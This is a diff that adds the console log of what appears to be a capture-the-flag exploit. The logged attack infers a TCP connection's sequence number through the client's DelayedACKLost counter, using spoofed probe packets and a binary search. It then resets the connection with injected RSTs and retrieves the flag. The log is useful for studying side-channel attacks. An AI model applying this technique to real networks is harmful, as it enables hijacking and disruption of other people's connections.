@@ -1,0 +1,41 @@
+[+] DelayedACKLost on client: 0 (INIT)
+[-] Sent fake probe packet from server to client with sequence          0. DelayedACKLost counter on client:   1
+[-] Sent fake probe packet from server to client with sequence   16777216. DelayedACKLost counter on client:   2
+[-] Sent fake probe packet from server to client with sequence   33554432. DelayedACKLost counter on client:   3
+[-] Sent fake probe packet from server to client with sequence   50331648. DelayedACKLost counter on client:   4
+[-] Sent fake probe packet from server to client with sequence   67108864. DelayedACKLost counter on client:   4
+[!] DelayedACKLost counter did not increase.
+[+] Determined lower bound of sequence number: 50331648
+[+] Determined upper bound of sequence number: 67108864
+[+] Starting divide and conquer in those bounds.
+[-] Sent fake probe packet from server to client with sequence   58720256. DelayedACKLost counter on client:   5 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   62914560. DelayedACKLost counter on client:   6 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   65011712. DelayedACKLost counter on client:   7 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   66060288. DelayedACKLost counter on client:   8 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   66584576. DelayedACKLost counter on client:   9 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   66846720. DelayedACKLost counter on client:   9 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66715648. DelayedACKLost counter on client:  10 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   66781184. DelayedACKLost counter on client:  10 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66748416. DelayedACKLost counter on client:  10 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66732032. DelayedACKLost counter on client:  11 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   66740224. DelayedACKLost counter on client:  11 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736128. DelayedACKLost counter on client:  12 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   66738176. DelayedACKLost counter on client:  12 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66737152. DelayedACKLost counter on client:  12 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736640. DelayedACKLost counter on client:  12 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736384. DelayedACKLost counter on client:  13 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   66736512. DelayedACKLost counter on client:  13 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736448. DelayedACKLost counter on client:  14 (increased: sequence number is bigger)
+[-] Sent fake probe packet from server to client with sequence   66736480. DelayedACKLost counter on client:  14 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736464. DelayedACKLost counter on client:  14 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736456. DelayedACKLost counter on client:  14 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736452. DelayedACKLost counter on client:  14 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736450. DelayedACKLost counter on client:  14 (not increased: sequence number is smaller)
+[-] Sent fake probe packet from server to client with sequence   66736449. DelayedACKLost counter on client:  15 (increased: sequence number is bigger)
+[+] Sequence number approximately: 66736450
+[+] Sending 20 RSTs with increasing sequences just in case...
+[!] Connection to server on client should be reset now.
+[+] Sending a fake packet to the server to trigger a packet to the client and in turn a proper RST from client to server.
+[!] Connection from client on server should be reset now as well.
+[+] Connecting to the server to get the flag.
+[!] Flag: *ctf{ohhh_just_other_web_s111de_channel}
